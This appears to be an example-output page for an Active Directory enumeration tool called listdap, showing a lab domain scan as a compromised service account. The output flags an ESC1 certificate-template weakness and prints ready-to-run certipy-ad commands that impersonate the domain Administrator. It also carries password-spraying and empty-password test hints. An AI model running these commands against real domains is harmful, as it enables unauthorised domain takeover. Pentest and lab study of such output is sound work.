# Example output

A full `listdap` scan authenticated as the compromised `svc_ca` account against a lab DC (all modules). It enumerates the domain, users, groups, policies and ACLs, then flags **ESC1** on `Welcome-Template` — enrollable by the current identity — with a ready-to-run exploitation command. *(Domain, IP, CA name, SID and password anonymised.)*

![Full listdap scan as svc_ca, flagging ESC1](example-output.svg)

<details>
<summary>Plain-text version</summary>

```text
  ██╗     ██╗███████╗████████╗██████╗  █████╗ ██████╗ 
  ██║     ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗
  ██║     ██║███████╗   ██║   ██║  ██║███████║██████╔╝
  ██║     ██║╚════██║   ██║   ██║  ██║██╔══██║██╔═══╝ 
  ███████╗██║███████║   ██║   ██████╔╝██║  ██║██║     
  ╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝     

[*] Connecting to 10.10.10.10:636 (LDAPS)

  ✔ Connected
    Target:  10.10.10.10:636
    Auth:  Kerberos (GSSAPI)
    Base DN:  DC=corp,DC=local

╔════════════════════════════════════════════════════════════╗
║                     DOMAIN INFORMATION                     ║
╚════════════════════════════════════════════════════════════╝
    Domain:  corp.local
    Base DN:  DC=corp,DC=local
    Forest DN:  DC=corp,DC=local
    DC Hostname:  DC01.corp.local
    Domain Func. Level:  Windows Server 2016 / 2019 / 2022
    Forest Func. Level:  Windows Server 2016 / 2019 / 2022
    Auth Method:  Kerberos (GSSAPI)
    Auth Note:  TGT acquired via impacket
    Authenticated as:  corp.local\svc_ca
    Domain SID:  S-1-5-21-1111111111-2222222222-3333333333
    Domain Created:  2025-09-13 16:39:42+00:00

  ── FSMO Roles ──
    PDC Emulator / RID Master:  DC01
    Infrastructure Master:  DC01
    Schema Master:  DC01
    Domain Naming Master:  DC01
[+] MachineAccountQuota = 0  (safe)

  ── Pre-Windows 2000 Compatible Access ──
[*] 2 member(s) in Pre-Windows 2000 Compatible Access group

╔════════════════════════════════════════════════════════════╗
║                           USERS                            ║
╚════════════════════════════════════════════════════════════╝
[*] Users: 11 total | 2 disabled | 0 locked | 0 AS-REP roastable | 0 Kerberoastable | 1 passwd_notreqd | 0 shadow creds | 2 adminCount=1

  ── Privileged Users ──
    Username       Privileged Groups                                                                             Last Logon  Description                                           
    ─────────────  ────────────────────────────────────────────────────────────────────────────────────────────  ──────────  ──────────────────────────────────────────────────────
    Administrator  Group Policy Creator Owners, Domain Admins, Enterprise Admins, Schema Admins, Administrators  unknown     Built-in account for administering the computer/domain

  ── PASSWD_NOTREQD (may have empty password) ──
    Username  UAC Flags                                Description                                             
    ────────  ───────────────────────────────────────  ────────────────────────────────────────────────────────
    Guest     DISABLED, PASSWD_NOTREQD, NO_EXPIRE_PWD  Built-in account for guest access to the computer/domain

  ── Inactive / Never Logged-in (>90 days) ──
    Username    Last Logon  Flags                                    Description                                             
    ──────────  ──────────  ───────────────────────────────────────  ────────────────────────────────────────────────────────
    Guest       never       DISABLED, PASSWD_NOTREQD, NO_EXPIRE_PWD  Built-in account for guest access to the computer/domain
    krbtgt      never       DISABLED                                 Key Distribution Center Service Account                 
    j.crickets  never       NO_EXPIRE_PWD                                                                                    
    e.blanch    never       NO_EXPIRE_PWD                                                                                    
    j.johnson   never       NO_EXPIRE_PWD                                                                                    
    svc_web     never       NO_EXPIRE_PWD                            Web Server in Progress                                  
[*] 6 inactive/never-logged account(s) — lower risk for password spraying detection

  ── AdminSDHolder Protected (adminCount=1) ──
    Username       UAC Flags      Description                                           
    ─────────────  ─────────────  ──────────────────────────────────────────────────────
    Administrator  NO_EXPIRE_PWD  Built-in account for administering the computer/domain
    krbtgt         DISABLED       Key Distribution Center Service Account               

  ── All Users ──
    Username       Last Logon  Flags                                    Description                                             
    ─────────────  ──────────  ───────────────────────────────────────  ────────────────────────────────────────────────────────
    Administrator  unknown     NO_EXPIRE_PWD                            Built-in account for administering the computer/domain  
    Guest          never       DISABLED, PASSWD_NOTREQD, NO_EXPIRE_PWD  Built-in account for guest access to the computer/domain
    krbtgt         never       DISABLED                                 Key Distribution Center Service Account                 
    e.hills        unknown     NO_EXPIRE_PWD                                                                                    
    j.crickets     never       NO_EXPIRE_PWD                                                                                    
    e.blanch       never       NO_EXPIRE_PWD                                                                                    
    i.park         unknown     NO_EXPIRE_PWD                            IT Intern                                               
    j.johnson      never       NO_EXPIRE_PWD                                                                                    
    a.harris       unknown     NO_EXPIRE_PWD                                                                                    
    svc_ca         unknown     NO_EXPIRE_PWD                                                                                    
    svc_web        never       NO_EXPIRE_PWD                            Web Server in Progress                                  

╔════════════════════════════════════════════════════════════╗
║                           GROUPS                           ║
╚════════════════════════════════════════════════════════════╝
[*] Groups: 51 total | 17 high-value

  ── High-Value Groups ──
    Administrators  [Domain Local Security]  3 member(s)  — Administrators have complete and unrestricted access to the computer/domain
        • Domain Admins  (CN=Domain Admins,OU=Groups,DC=corp,DC=local)
        • Enterprise Admins  (CN=Enterprise Admins,OU=Groups,DC=corp,DC=local)
        • Administrator  (CN=Administrator,CN=Users,DC=corp,DC=local)
    Print Operators  [Domain Local Security]  0 member(s)  — Members can administer printers installed on domain controllers
    Backup Operators  [Domain Local Security]  0 member(s)  — Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
    Remote Desktop Users  [Domain Local Security]  0 member(s)  — Members in this group are granted the right to logon remotely
    Hyper-V Administrators  [Domain Local Security]  0 member(s)  — Members of this group have complete and unrestricted access to all features of Hyper-V.
    Remote Management Users  [Domain Local Security]  1 member(s)  — Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
        • Alice Harris  (CN=Alice Harris,CN=Users,DC=corp,DC=local)
    Storage Replica Administrators  [Domain Local Security]  0 member(s)  — Members of this group have complete and unrestricted access to all features of Storage Replica.
    Schema Admins  [Universal Security]  1 member(s)  — Designated administrators of the schema
        • Administrator  (CN=Administrator,CN=Users,DC=corp,DC=local)
    Enterprise Admins  [Universal Security]  1 member(s)  — Designated administrators of the enterprise
        • Administrator  (CN=Administrator,CN=Users,DC=corp,DC=local)
    Domain Admins  [Global Security]  1 member(s)  — Designated administrators of the domain
        • Administrator  (CN=Administrator,CN=Users,DC=corp,DC=local)
    Group Policy Creator Owners  [Global Security]  1 member(s)  — Members in this group can modify group policy for the domain
        • Administrator  (CN=Administrator,CN=Users,DC=corp,DC=local)
    Server Operators  [Domain Local Security]  0 member(s)  — Members can administer domain servers
    Account Operators  [Domain Local Security]  0 member(s)  — Members can administer domain user and group accounts
    Protected Users  [Global Security]  0 member(s)  — Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Key Admins  [Global Security]  0 member(s)  — Members of this group can perform administrative actions on key objects within the domain.
    Enterprise Key Admins  [Universal Security]  0 member(s)  — Members of this group can perform administrative actions on key objects within the forest.
    DnsAdmins  [Domain Local Security]  0 member(s)  — DNS Administrators Group

╔════════════════════════════════════════════════════════════╗
║                         COMPUTERS                          ║
╚════════════════════════════════════════════════════════════╝
[*] Computers: 1 total | 1 DCs | 0 EOL OS | 0 unconstrained deleg | 0 constrained deleg | 0 shadow creds

  ── Domain Controllers ──
    Name  DNS                 OS                                       Last Logon
    ────  ──────────────────  ───────────────────────────────────────  ──────────
    DC01  DC01.corp.local  Windows Server 2022 Standard Evaluation  unknown   

╔════════════════════════════════════════════════════════════╗
║                    GROUP POLICY OBJECTS                    ║
╚════════════════════════════════════════════════════════════╝
[*] GPOs: 2 total | 2 notable

  ── Notable GPOs ──
    Name                               Path                                                                                  Status 
    ─────────────────────────────────  ────────────────────────────────────────────────────────────────────────────────────  ───────
    Default Domain Policy              \\corp.local\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}  enabled
    Default Domain Controllers Policy  \\corp.local\sysvol\corp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}  enabled

╔════════════════════════════════════════════════════════════╗
║                     PASSWORD POLICIES                      ║
╚════════════════════════════════════════════════════════════╝

  ── Default Domain Password Policy ──
    Min. Password Length:  7
    Password History:  24 passwords remembered
    Max. Password Age:  unknown
    Complexity:  No complexity requirement
    Lockout Threshold:  0 (disabled)
    Lockout Duration:  unknown
    Lockout Obs. Window:  unknown

  ── Spray Planning ──
[+] No lockout threshold — unlimited spraying possible (be loud!)

╔════════════════════════════════════════════════════════════╗
║                       DOMAIN TRUSTS                        ║
╚════════════════════════════════════════════════════════════╝
[*] No trusts found

╔════════════════════════════════════════════════════════════╗
║                        DELEGATIONS                         ║
╚════════════════════════════════════════════════════════════╝
[*] Delegation findings: 0 total | 0 unconstrained | 0 constrained | 0 RBCD

╔════════════════════════════════════════════════════════════╗
║                ACLs — SENSITIVE PERMISSIONS                ║
╚════════════════════════════════════════════════════════════╝

  ── DCSync Rights (DS-Replication-Get-Changes-All) ──
[+] No unexpected DCSync rights detected

  ── Dangerous Permissions on Sensitive Objects ──
[+] No dangerous permissions detected on sensitive objects

╔════════════════════════════════════════════════════════════╗
║                            LAPS                            ║
╚════════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════════╗
║                ADCS — CERTIFICATE SERVICES                 ║
╚════════════════════════════════════════════════════════════╝
[+] 1 Certificate Authority(ies) found
[*] Certificate Templates: 34 total

  ── CA: CORP-CA ──
    Hostname:  DC01.corp.local
    Published templates:  12

  ── ESC1 — Enrollee Supplies Subject + Client Auth EKU ──
    Welcome-Template
          EKUs:  1.3.6.1.5.5.7.3.1, 1.3.6.1.5.5.7.3.2
          Enrollable by:  corp.local\svc_ca
          Exploit:  
        certipy-ad req -u 'svc_ca@corp.local' -p 'P@ssw0rd!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'Welcome-Template' -upn 'Administrator@corp.local'
        certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10

  ── ESC1 (config) — not enrollable by current identity ──
    Subordinate Certification Authority
          Enrollment rights:  Domain Admins, Enterprise Admins
[*] Above templates match ESC1 config but the current identity cannot enroll — exploitable only after gaining one of the listed identities, or via ESC4 if you can edit the template ACL.

╔════════════════════════════════════════════════════════════╗
║                     SHADOW CREDENTIALS                     ║
╚════════════════════════════════════════════════════════════╝
[+] No objects with msDS-KeyCredentialLink found

╔════════════════════════════════════════════════════════════╗
║                         QUICK WINS                         ║
╚════════════════════════════════════════════════════════════╝
  [CRITICAL] ESC1 — 1 vulnerable template(s)
         Allows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).
         Enrollable by a principal the current identity controls:
           - Welcome-Template  (enrollable by: corp.local\svc_ca)
               certipy-ad req -u 'svc_ca@corp.local' -p 'P@ssw0rd!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'Welcome-Template' -upn 'Administrator@corp.local'
               certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
  [HIGH] No account lockout policy
         Unlimited password spraying / brute-force is possible without locking accounts.
  [MEDIUM] PASSWD_NOTREQD — 1 account(s)
         These accounts may have empty passwords. Test with: netexec smb ... -u <user> -p ''
  [MEDIUM] Weak minimum password length (7)
         Short passwords are easier to crack after a hash dump.
  [MEDIUM] Password complexity disabled
         Users may set simple dictionary passwords.
  [INFO] Schema Admins: 1 member(s)
         Administrator
  [INFO] Enterprise Admins: 1 member(s)
         Administrator
  [INFO] Domain Admins: 1 member(s)
         Administrator
```

</details>
